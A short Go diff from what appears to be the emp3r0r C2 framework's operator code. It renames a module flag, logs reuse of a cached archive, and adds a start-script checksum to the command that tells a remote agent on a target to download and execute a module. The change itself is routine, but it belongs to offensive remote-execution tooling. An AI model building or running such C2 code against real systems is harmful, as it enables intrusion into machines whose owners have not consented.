@@ -77,7 +77,7 @@ func moduleCustom() {
 
 		// in-memory module
 		if config.InMemory {
-			cmd := fmt.Sprintf("%s --mod %s --in_mem", emp3r0r_data.C2CmdCustomModule, CurrentMod)
+			cmd := fmt.Sprintf("%s --mod_name %s --in_mem", emp3r0r_data.C2CmdCustomModule, CurrentMod)
 			cmd_id := uuid.NewString()
 			err = SendCmdToCurrentTarget(cmd, cmd_id)
 			if err != nil {
@@ -98,11 +98,13 @@ func moduleCustom() {
 			}
 			CliPrintInfo("Created %.4fMB archive (%s) for module '%s'",
 				float64(util.FileSize(tarball))/1024/1024, tarball, CurrentMod)
+		} else {
+			CliPrintInfo("Using cached %s", tarball)
 		}
 
 		// tell agent to download and execute this module
 		checksum := tun.SHA256SumFile(tarball)
-		cmd := fmt.Sprintf("%s --mod_name %s --checksum %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, checksum)
+		cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --startscript_checksum %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, checksum, tun.SHA256SumFile(start_script))
 		cmd_id := uuid.NewString()
 		err = SendCmdToCurrentTarget(cmd, cmd_id)
 		if err != nil {
